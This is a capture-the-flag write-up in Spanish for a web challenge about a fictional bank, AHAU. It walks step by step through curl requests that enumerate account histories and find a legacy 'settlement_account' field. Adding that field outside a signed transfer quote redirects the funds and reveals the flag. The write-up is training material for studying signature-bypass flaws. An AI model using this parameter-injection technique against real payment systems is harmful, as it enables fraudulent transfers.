# [Web] Transferencia fantasma

## Descripción

Banco AHAU acaba de implementar cotizaciones firmadas para proteger sus transferencias. Sin embargo, algunos registros históricos sugieren que sus sistemas antiguos y nuevos no siempre interpretan las operaciones de la misma manera. Analiza la API, identifica la inconsistencia y recupera la flag.

Credenciales: demo.player / transfer-2026
Comienza en POST /api/auth/login

<http://44.202.188.54:18085>

### Hint 1

Los comprobantes antiguos conservan detalles de procesos que la interfaz actual ya no muestra. Conecta el historial interno con el comprobante histórico y su nota de procesamiento

## Análisis

Comencé haciendo login en el endpoint indicado:

```bash
curl -sS -X POST \
  'http://44.202.188.54:18085/api/auth/login' \
  -H 'Content-Type: application/json' \
  --data-binary '{"username":"demo.player","password":"transfer-2026"}'
```

Inicialmente, el servidor devolvía únicamente:

```json
{
  "access_token":"ahau_demo_7e8d32b1",
  "token_type":"bearer"
}
```

Como el enunciado hablaba de cotizaciones firmadas, probé las rutas `/api/transfers/quote` y `/api/transfers/confirm`. Al enviar `OPTIONS`, ambas respondían `405 Method Not Allowed` con `Allow: POST`. Además, un `POST` vacío producía errores `422` que mostraban los campos esperados.

`/api/transfers/quote` requería:

```json
{
  "source_account":"...",
  "destination_account":"...",
  "amount_minor":100
}
```

Mientras que `/api/transfers/confirm` esperaba un objeto `quote` y su `signature`. Lamentablemente, cualquier cuenta origen que probaba terminaba en:

```json
{"detail":"Source account is not owned by this identity"}
```

El login no proporcionaba el identificador de la cuenta perteneciente a `demo.player`, por lo que todavía no era posible obtener una cotización válida.

Buscando el historial mencionado por el hint 1 encontré otras dos rutas: `/api/receipts/{receipt_id}`, el cual respondía `Receipt not found` ya que no encontraba ningún ID válido de receipt, y `/api/accounts/{account_id}/transactions` que respondía `Account has no visible transactions`.

Sin embargo, seguíamos sin conocer un `account_id` real o alguna otra ruta que nos pudiera ayudar, incluso tras horas de fuzzing. Después de un tiempo repetí el mismo login. Esta vez la respuesta había cambiado:

```json
{
  "access_token":"ahau_demo_7e8d32b1",
  "token_type":"bearer",
  "account_id":"acct-demo-7d30"
}
```

> Nota: el campo `account_id` no estaba presente en la respuesta original del login; fue agregado silenciosamente durante el CTF después de varias horas de que nadie lograra resolver el reto.

Con el login corregido y ya teniendo la cuenta correcta, podíamos conseguir su historial:

```bash
curl -sS \
  'http://44.202.188.54:18085/api/accounts/acct-demo-7d30/transactions' \
  -H 'Authorization: Bearer ahau_demo_7e8d32b1'
```

La respuesta contenía una transacción hacia otra cuenta:

```json
{
  "account_id":"acct-demo-7d30",
  "transactions":[
    {
      "transaction_id":"txn-demo-1001",
      "counterparty_account":"acct-ops-4931",
      "amount_minor":-2500,
      "receipt_id":null,
      "memo":"Monthly account transfer"
    }
  ]
}
```

Aunque el `receipt_id` era `null`, teníamos una nueva cuenta, así que revisé su historial:

```bash
curl -sS \
  'http://44.202.188.54:18085/api/accounts/acct-ops-4931/transactions' \
  -H 'Authorization: Bearer ahau_demo_7e8d32b1'
```

Esta segunda cuenta sí contiene el `receipt_id`:

```json
{
  "account_id":"acct-ops-4931",
  "transactions":[
    {
      "transaction_id":"txn-ops-2001",
      "counterparty_account":"acct-merchant-2048",
      "amount_minor":-2500,
      "receipt_id":"rcpt-ops-1842",
      "memo":"Archived settlement batch"
    }
  ]
}
```

Ahora, consultando el recibo:

```bash
curl -sS \
  'http://44.202.188.54:18085/api/receipts/rcpt-ops-1842' \
  -H 'Authorization: Bearer ahau_demo_7e8d32b1'
```

obtuvimos el comprobante y su nota de procesamiento:

```json
{
  "receipt_id":"rcpt-ops-1842",
  "source_account":"acct-ops-4931",
  "destination_account":"acct-merchant-2048",
  "amount_minor":2500,
  "processing_note":"Legacy operations confirmations use settlement_account=ops-settlement-archive after approval."
}
```

Esta nota revelaba un campo que no aparecía dentro de las cotizaciones modernas, `settlement_account`, como indicaba la hint. También nos dio una nueva cuenta `acct-merchant-2048`, válida como destino para transferencias.

## Extracción

Primero solicité una cotización legítima hacia ese merchant:

```bash
curl -sS -X POST \
  'http://44.202.188.54:18085/api/transfers/quote' \
  -H 'Authorization: Bearer ahau_demo_7e8d32b1' \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "source_account":"acct-demo-7d30",
    "destination_account":"acct-merchant-2048",
    "amount_minor":100
  }'
```

El servidor devolvió un quote firmado:

```json
{
  "quote":{
    "quote_id":"q_59uPc_9C-SectWIc",
    "source_account":"acct-demo-7d30",
    "destination_account":"acct-merchant-2048",
    "amount_minor":100,
    "expires_at":1788106889,
    "nonce":"uVLAPFknum_snjw1VOOqMQ"
  },
  "signature":"dbfb363aafddbd1370bbde074c23ace20bc75d1db779d1ae5bd91bf31196fcd7"
}
```

Antes de utilizarlo, envié una cotización falsa agregando `settlement_account` como campo adicional en el nivel superior. La respuesta fue `Invalid quote signature` en vez del error común `extra_forbidden`, por lo que confirmé que el campo era reconocido por el servicio. Ahora envié el quote real, pero añadí el valor encontrado en la nota de procesamiento:

```bash
curl -sS -X POST \
  'http://44.202.188.54:18085/api/transfers/confirm' \
  -H 'Authorization: Bearer ahau_demo_7e8d32b1' \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "quote":{
      "quote_id":"q_59uPc_9C-SectWIc",
      "source_account":"acct-demo-7d30",
      "destination_account":"acct-merchant-2048",
      "amount_minor":100,
      "expires_at":1788106889,
      "nonce":"uVLAPFknum_snjw1VOOqMQ"
    },
    "signature":"dbfb363aafddbd1370bbde074c23ace20bc75d1db779d1ae5bd91bf31196fcd7",
    "settlement_account":"ops-settlement-archive"
  }'
```

La confirmación fue aceptada:

```json
{
  "receipt_id":"rcpt_gXMNHWpQ4V9BmB__CEc",
  "status":"accepted"
}
```

Finalmente consulté el nuevo comprobante:

```bash
curl -sS \
  'http://44.202.188.54:18085/api/receipts/rcpt_gXMNHWpQ4V9BmB__CEc' \
  -H 'Authorization: Bearer ahau_demo_7e8d32b1'
```

Esto regresó:

```json
{
  "receipt_id":"rcpt_gXMNHWpQ4V9BmB__CEc",
  "source_account":"acct-demo-7d30",
  "destination_account":"acct-vault-7619",
  "amount_minor":100,
  "processing_note":"Transfer accepted.",
  "flag":"AHAU{h4ck3r_3n_3l_m1d1_3s_3l_m4s_f0rt3}"
}
```

Aunque la cotización firmada tenía como destino `acct-merchant-2048`, podemos ver en el comprobante que el campo legacy `settlement_account` tomó precedencia y redirigió la transferencia a `acct-vault-7619`, de manera que el sistema moderno verificaba una operación pero el backend terminaba ejecutando otra.

## Flag

`AHAU{h4ck3r_3n_3l_m1d1_3s_3l_m4s_f0rt3}`
